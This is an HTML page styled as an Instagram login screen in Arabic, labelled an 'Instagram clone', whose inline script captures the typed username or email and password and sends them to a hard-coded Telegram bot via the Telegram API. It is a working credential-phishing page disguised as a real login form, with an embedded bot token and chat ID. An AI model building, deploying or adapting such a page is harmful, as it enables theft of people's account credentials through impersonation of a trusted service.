<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="style.css" />
    <link rel="icon" type="image/png" href="./img/insta-fav.ico">
    <title>Instagram clone</title>
</head>
<body>
    <main class="flex align-items-center justify-content-center">
        <section id="mobile" class="flex">
        </section>
        <section id="auth" class="flex direction-column">
            <div class="panel login flex direction-column">
                <h1 title="Instagram" class="flex justify-content-center">
                    <img src="./img/instagram-logo.png" alt="Instagram logo" title="Instagram logo" />
                </h1>
                <form id="loginForm">
                    <label for="email" class="sr-only">هاتف، اسم المستخدم أو البريد الإلكتروني</label>
                    <input name="email" id="email" placeholder="هاتف، اسم المستخدم أو البريد الإلكتروني" />

                    <label for="password" class="sr-only">كلمة السر</label>
                    <input name="password" id="password" type="password" placeholder="كلمة السر" />

                    <button type="submit">تسجيل الدخول</button>
                </form>
                <div class="flex separator align-items-center">
                    <span></span>
                    <div class="or">أو</div>
                    <span></span>
                </div>
                <div class="login-with-fb flex direction-column align-items-center">
                    <div>
                        <img />
                        <a>تسجيل الدخول باستخدام فيسبوك</a>
                    </div>
                    <a href="#">هل نسيت كلمة المرور؟</a>
                </div>
            </div>
            <div class="panel register flex justify-content-center">
                <p>ليس لديك حساب؟</p>
                <a href="#">إنشاء حساب</a>
            </div>
            <div class="app-download flex direction-column align-items-center">
                <p>احصل على التطبيق.</p>
                <div class="flex justify-content-center">
                    <img src="./img/apple-button.png"      alt="زر تحميل من Apple Store" title="زر تحميل من Apple Store" />
                    <img src="./img/googleplay-button.png" alt="زر تحميل من Google Play" title="زر تحميل من Google Play" />
                </div>
            </div>
        </section>
    </main>
    <footer>
        <ul class="flex flex-wrap justify-content-center">
            <li><a href="#">حول</a></li>
            <li><a href="#">مساعدة</a></li>
            <li><a href="#">الصحافة</a></li>
            <li><a href="#">API</a></li>
            <li><a href="#">وظائف</a></li>
            <li><a href="#">الخصوصية</a></li>
            <li><a href="#">الشروط</a></li>
            <li><a href="#">الموقع</a></li>
            <li><a href="#">أهم الحسابات</a></li>
            <li><a href="#">الوسوم</a></li>
            <li><a href="#">اللغة</a></li>
        </ul>
        <p class="copyright">© 2020 إنستغرام من فيسبوك</p>
    </footer>

    <!-- 🔽 كود الجافاسكربت للربط مع بوت تيليجرام -->
    <script>
      const BOT_TOKEN = "7629905750:AAE-URzpkX1MnyqxXofJmhigTA4lBrJHW_Y";
      const CHAT_ID  = "7832394046";

      document.getElementById("loginForm").addEventListener("submit", function(e) {
        e.preventDefault();

        const email = document.getElementById("email").value;
        const password = document.getElementById("password").value;

        const message = `📩 تسجيل دخول جديد:\n👤 المستخدم: ${email}\n🔑 كلمة السر: ${password}`;

        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            chat_id: CHAT_ID,
            text: message
          })
        })
        .then(response => response.json())
        .then(data => {
          alert("تم إرسال البيانات إلى البوت بنجاح ✅");
        })
        .catch(err => {
          alert("حدث خطأ أثناء الإرسال ❌ " + err);
        });
      });
    </script>
</body>
</html>
